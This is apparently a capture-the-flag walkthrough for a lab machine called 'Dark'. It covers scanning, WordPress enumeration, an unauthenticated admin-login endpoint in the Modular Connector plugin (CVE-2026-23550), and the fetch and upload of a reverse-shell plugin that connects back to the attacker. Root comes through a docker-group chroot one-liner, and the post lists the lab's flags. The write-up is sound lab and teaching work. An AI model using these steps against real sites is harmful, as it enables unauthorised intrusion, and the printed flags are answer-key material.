+++
title = "Dark - Walkthrough"
author = "nvru"
date="2026-07-25"
description = "Walkthrough for the Dark machine."
tags = [
"ctf",
"walkthrough",
"linux",
"wordpress",
"cve-2026-23550",
"privilege-escalation",
"docker"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.200.74.40`
- **Target Machine IP:** `10.1.113.43`

The objective was to enumerate the target, identify exposed services, gain initial access by exploiting an unauthenticated WordPress privilege escalation vulnerability (CVE-2026-23550), and escalate privileges to root through Docker group membership.

![Machine Information](/images/hsm/dark/vm.png)

---

## Port Scanning

### RustScan

The first step was identifying the exposed services running on the target.

```bash
rustscan -a 10.1.113.43 -- -A -oN nmap/rust
```

### Results

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache 2.4.52
                 WordPress 6.0
```

Only two services were exposed:

- **SSH** on port **22**
- **Apache HTTP Server** on port **80** hosting a **WordPress 6.0** website

With such a small attack surface, the next step was to enumerate the web application.

---

## Enumeration

### HTTP Enumeration

Browsing to the website presented a very simple WordPress page containing only a quote.

![Homepage](/images/hsm/dark/http.png)

Nothing interesting was exposed on the homepage, and reviewing the page source did not reveal any hidden comments, JavaScript files, or credentials.

---

### robots.txt

Checking `robots.txt` revealed the standard WordPress administrative paths.

```text
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://10.1.113.43/wp-sitemap.xml
```

![robots.txt](/images/hsm/dark/robots.png)

---

### WordPress Login Page

The WordPress login page was available at `/wp-admin`.

To determine whether the common `admin` username existed, I submitted a login request using a dummy password. WordPress responded with an **Unknown username** error, confirming that no account named `admin` existed.

![Invalid Username](/images/hsm/dark/admin_no.png)

Since the login page did not disclose a valid username, I continued enumerating the application instead of attempting further guesses.

---

### Directory Enumeration

Before running WPScan, I performed some basic directory enumeration.

```bash
gobuster dir \
-u http://10.1.113.43 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

While enumerating the site, I visited the default WordPress post located at:

```text
http://10.1.113.43/hello-world
```

The author information exposed the administrator username:

```text
streetcoderadmin
```

![Administrator Username](/images/hsm/dark/admin_name.png)

Having the administrator username would become useful if authentication was ever required.

---

### WordPress Enumeration

Since the target was running WordPress, I used **WPScan** to enumerate installed plugins and identify any publicly known vulnerabilities.

```bash
wpscan \
  --url http://10.1.113.43/ \
  --api-token [TOKEN] \
  -e p \
  --plugins-detection mixed
```

WPScan detected the **Modular Connector** plugin and reported two known vulnerabilities affecting the installed version.

```text
Plugin: Modular Connector

CVE-2026-23550
Unauthenticated Privilege Escalation

CVE-2026-3903
Cross-Site Request Forgery (CSRF)
```

![Detected Vulnerabilities](/images/hsm/dark/two_cve.png)

The most critical finding was **CVE-2026-23550**, an unauthenticated privilege escalation vulnerability that allows an attacker to obtain administrative access without valid credentials.

WPScan linked to the following advisory, which includes a proof of concept:

- https://wpscan.com/vulnerability/3ccaa0fd-b11c-4f9f-bab5-644a53b11035/

The advisory described the vulnerable endpoint:

```text
/api/modular-connector/login/d?origin=mo&type=c
```

After adapting the request to the target, I was successfully authenticated as the WordPress administrator without knowing the account password.

```text
Username: streetcoderadmin
```

![WordPress Dashboard](/images/hsm/dark/log.png)

With administrator access to the WordPress dashboard, the next objective was achieving remote code execution.

---

## Initial Access

### Plugin Upload

Now that I had administrator privileges, the obvious goal was remote code execution.

My first idea was to modify the active theme through the built-in Theme Editor. However, every modification was sanitized when saving the file, preventing code execution.

Instead, I decided to upload a malicious plugin.

The first plugin I found was:

```
https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin
```

![Plugin1 ](/images/hsm/dark/fir_plg.png)

However, uploading it failed with:

```text
The uploaded file exceeds the upload_max_filesize directive in php.ini.
```

Since the plugin archive was too large, I searched for a smaller alternative.

The next plugin I found was:

```
https://github.com/Bhanunamikaze/Wordpress_ReverseShell
```

![Plugin2 ](/images/hsm/dark/sec_plg.png)

I downloaded the PHP file and created my own ZIP archive.

```bash
wget https://github.com/bhanunamikaze/Wordpress_ReverseShell/raw/main/system-health-monitor.php

mkdir system-health-monitor

cp system-health-monitor.php system-health-monitor/

zip -r system-health-monitor.zip system-health-monitor/
```

The upload completed successfully.

After activation, a new **Health Monitor** menu appeared inside the WordPress dashboard.

The plugin only required specifying:

- Attacker IP
- Listening Port
- Connection Method

![Health Plugin](/images/hsm/dark/sec_explain.png)

Once configured, it immediately connected back to my listener.

![Reverse Shell](/images/hsm/dark/rev_shell.png)

I stabilized the shell with:

```bash
script -q /dev/null
bash -i
```

![Machine Information](/images/hsm/dark/stable.png)

---

## Privilege Escalation

### Docker Group

After obtaining a shell, the first step was checking the current user's group memberships.

```bash
groups
```

The output showed that the `www-data` user was a member of the **docker** group.

![Groups](/images/hsm/dark/groups.png)

Membership in the Docker group grants the ability to create and manage containers. Since Docker containers can be started with the host filesystem mounted, this permission can be abused to access the host system with root privileges.

This provided a direct path to privilege escalation.

---

### Root via Docker

I launched an Alpine container while mounting the host root filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

The command immediately dropped me into a root shell on the host system.

![Root Shell](/images/hsm/dark/docker_root.png)

From there I located user flag

```bash
find / -name user.txt 2>/dev/null
```

![User flag](/images/hsm/dark/user_flag.png)

---

## Post-Exploitation Cleanup

After completing the exploitation process and collecting the required information, I removed the files and plugins used during testing to clean up the artifacts created during the assessment.

I navigated to the WordPress plugins directory and reviewed the installed plugins.

```bash
cd /var/www/172_16_1_84_/public/wp-content/plugins

ls -la
```

![Cleanup](/images/hsm/dark/clean.png)

The reverse shell plugin used during exploitation was removed to prevent leaving unnecessary artifacts on the target system.

---

## Credentials

```text
WordPress Administrator
-----------------------
Username: streetcoderadmin
Password: Obtained via CVE-2026-23550
```

---

## Flags

```text
user:flag{w0redPress-2026-23550}

root:flag{docker-is-fun-0385}
```
